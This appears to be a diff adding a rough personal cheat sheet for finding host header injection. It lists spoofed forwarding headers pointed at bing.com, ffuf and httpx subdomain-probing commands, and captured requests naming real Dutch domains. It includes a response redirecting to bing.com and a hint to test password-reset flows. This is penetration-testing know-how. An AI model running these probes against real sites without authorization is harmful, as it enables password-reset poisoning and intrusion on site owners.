@@ -1,0 +1,112 @@
+ Host header
+============                                                                           
+
+
+some time try   bing.com and google.com
+
+Origion: bing.com
+
+Host: crspl.naturalis.nl
+
+
+
+Host: bing.com
+
+
+
+Host: crspl.naturalis.nl
+X-Forwarded-For: bing.com
+
+
+
+
+Host: bing.com
+X-Forwarded-For: crspl.naturalis.nl
+
+
+
+status code of 200 | 201 | 202 | 203 | 204
+
+status code of 300 | 301 | 302 | 303 | 304
+
+ fist method to find host header injection change real host to bing.com
+
+ 
+ second method to find host header injection change  host  bing.com  and X-Forwarded-Host realweb.com
+
+ third  method to find host header injection change  host  realweb.com  and X-Forwarded-Host  bing.com
+
+ forth method to find host header space eter   X-Forwarded-Host: bing.com
+
+eg- GET /bundles/js/plugins/jquery?v=Bz5SzsYZIbN7xG2Twiw1omyeMmDQHX0idScfW4b4fNA1 HTTP/1.1
+Host: inkoopsamenwerking.mett.nl
+ X-Forwarded-For: bing.com
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+
+
+X-Host: bing.com
+
+X-Forwarded-For: bing.com
+
+X-Forwarded: bing.com
+
+X-Forwarded-Host: bing.com
+
+X-Remote-IP: bing.com
+
+X-Remote-Addr: bing.com
+
+True-Clint-IP: bing.com
+
+Proxy-Clint-IP: bing.com
+
+X-Clint-IP: bing.com
+
+Redirect: bing.com
+
+Refrerer: bing.com
+
+Request-Uri: bing.com
+Host: bing.com
+X-Forwarded-For: bing.com
+X-Forwarded-Host: bing.com
+X-Client-IP: bing.com
+X-Remote-IP: bing.com
+X-Remote-Addr: bing.com
+X-Host: bing.com
+X-Forwarded: bing.com
+True-Clint-IP: bing.com
+x-Clint-IP: bing.com
+Proxy-Clint-IP: bing.com
+origin: bing.com
+X-Originating-IP: bing.com
+
+
+
+
+cat livesubdomin.txt | httpx-toolkit -sc -td -title -probe -fhr -location
+
+
+ffuf -u http://FUZZ.naturalis.nl -w /usr/share/wordlists/amass/subdomains-top1mil-110000.txt    -mc 301,302 -o fufsubdomain.txt  
+
+
+find  302 301 find host header injection
+
+
+check reset password me host header injection
+
+
+GET / HTTP/1.1
+Host: mijn.maasdriel.nl
+X-Forwarded-Host: bing.com     always try    
+
+
+HTTP/1.1 308 Permanent Redirect
+Date: Sat, 31 Aug 2024 18:58:08 GMT
+Content-Type: text/html
+Content-Length: 164
+Connection: close
+Location: https://bing.com
+
